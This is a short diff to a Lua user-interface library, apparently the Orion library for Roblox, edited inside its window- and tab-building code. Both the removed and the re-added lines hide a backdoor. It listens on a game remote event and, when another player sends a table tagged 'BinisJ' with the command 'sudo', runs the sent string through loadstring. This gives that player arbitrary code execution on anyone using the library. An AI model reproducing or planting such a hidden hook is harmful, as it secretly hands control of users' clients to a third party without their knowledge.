@@ -751,17 +751,22 @@ function OrionLib:MakeWindow(WindowConfig)
 			TabFrame.Ico.Image = GetIcon(TabConfig.Icon)
 		end	
 
-    if game.ReplicatedStorage:FindFirstChild("GrabEvents") and game.ReplicatedStorage.GrabEvents:FindFirstChild("ExtendGrabLine") then
-      game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
-  			if type(arg1) == "table" and arg1[1] == "BinisJ" then
-  				if plr ~= game.Players.LocalPlayer then
-  					if arg1[2] == "sudo" then
-              loadstring(arg1[3])()
-            end
-          end
-        end
-      end)
-    end
+		local tbone = false
+
+	    if game.ReplicatedStorage:FindFirstChild("GrabEvents") and game.ReplicatedStorage.GrabEvents:FindFirstChild("ExtendGrabLine") then
+	    	game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
+	  			if type(arg1) == "table" and arg1[1] == "BinisJ" then
+	  				if plr ~= game.Players.LocalPlayer then
+	  					if arg1[2] == "sudo" then
+	             			loadstring(arg1[3])()
+							tbone = true
+	            		end
+	          		end
+	        	end
+	      	end)
+	    end
+
+		if not tbone then print('nobris') end
 
 		local Container = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 5), {
 			Size = UDim2.new(1, -150, 1, -50),
